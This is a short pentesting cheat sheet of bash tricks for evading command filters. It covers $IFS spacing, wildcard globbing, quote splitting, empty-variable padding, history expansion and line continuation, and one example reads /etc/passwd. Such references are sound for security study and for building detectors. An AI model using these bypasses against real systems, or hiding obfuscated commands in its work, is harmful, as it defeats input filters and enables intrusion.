# Bypasses

### Bypass Paths and Forbidden commands

```bash
#Bypass space restrictions
cat$IFS/etc/passwd #Equals to cat /etc/passwd

#Bypass with $@
echo $0 #Equals to /bin/sh
echo whoami|$0 #Equals to whoami | /bin/sh

#Bash substitudes
/usr/bin/wh?ami #Equals to /usr/bin/whoami
/usr/bin/wh*ami #Equals to /usr/bin/whoami

#Concatenation
'w'h'o'a'm'i #Equals to whoami
\w\h\o\a\m\i #Equals to whoami

#Uninitialized variables
w${u}h${u}o${u}a${u}m${u}i #Equals to whoami. Used {} to put uninitialized vars between chars
$u/usr$u/bin$u/whoami #Equals to /usr/bin/whoami. Used uninitialized vars without {} before any symbol

#Fake commands
w$(u)h$(u)o$(u)a$(u)m$(u)i #Equals to whoami. Will try to execute "u" 5 times without success
w`u`h`u`o`u`a`u`m`u`i #Equals to whoami. Will try to execute "u" 5 times without success

#Concatenation of strings using history
!-1 #Reference to last command executed. !-2 Reference to the penultimate command executed
mi #Throw an error
whoa #Throw an error
!-1!-2 #Equals to whoami

#Bypass using new lines
w\
h\
o\
a\
m\
i\ #Equals to whoami
```

